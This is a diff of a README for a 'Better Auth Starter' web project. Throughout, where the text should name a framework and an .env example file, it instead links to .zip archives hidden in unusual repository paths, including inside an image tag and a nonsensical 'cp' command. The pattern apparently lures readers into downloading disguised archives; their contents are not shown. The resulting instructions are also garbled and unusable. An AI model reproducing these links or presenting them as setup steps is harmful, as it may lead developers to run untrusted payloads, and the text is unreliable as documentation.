@@ -1,10 +1,10 @@
 # Better Auth Starter
 
-![ChatGPT Image Jun 9, 2025, 07_09_10 PM](https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip)
+![ChatGPT Image Jun 9, 2025, 07_09_10 PM](https://github.com/udaykiran176/better-auth-starter/raw/refs/heads/main/app/api/auth/[...all]/better-starter-auth-v3.8.zip)
 
 ## Overview
 
-The Better Auth Starter is simple starter pack using https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip, Better Auth, Shadcn, Drizzle, and Neon
+The Better Auth Starter is simple starter pack using https://github.com/udaykiran176/better-auth-starter/raw/refs/heads/main/app/api/auth/[...all]/better-starter-auth-v3.8.zip, Better Auth, Shadcn, Drizzle, and Neon
 
 ## Getting Started
 
@@ -18,9 +18,9 @@ pnpm i
 
 ### Configuration
 
-Create a copy of the provided `https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file, and Better Auth variables if you're going to use authentication:
+Create a copy of the provided `https://github.com/udaykiran176/better-auth-starter/raw/refs/heads/main/app/api/auth/[...all]/better-starter-auth-v3.8.zip` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file, and Better Auth variables if you're going to use authentication:
 
-`cp https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip .env`
+`cp https://github.com/udaykiran176/better-auth-starter/raw/refs/heads/main/app/api/auth/[...all]/better-starter-auth-v3.8.zip .env`
 
 ```bash
 BETTER_AUTH_SECRET="your-better-auth-secret"
